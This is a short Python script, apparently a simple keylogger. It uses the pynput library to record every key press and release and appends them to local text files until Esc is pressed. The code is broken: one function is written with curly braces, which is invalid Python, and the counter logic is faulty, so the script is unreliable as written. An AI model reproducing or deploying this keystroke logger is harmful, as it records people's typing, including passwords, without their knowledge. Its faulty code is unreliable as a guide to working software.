from pynput import keyboard

count = 0
keyList = []

def on_press(key):
    global keyList, count

    keyList.append(key)
    count += 1
    print("{0} pressed".format(key))

    if (count >= 10):
        write_file()
        keyList = []

    



def on_release(key):
    file1 = open("Output.txt","a")
    print('{0} released'.format(
        key))
    file1.write('{0} released\n'.format(
        key))
    file1.close()
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def write_file() {
    with open("log.txt", "a") as f:
        for key in keyList:
            f.write(str(key))
}
    
# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

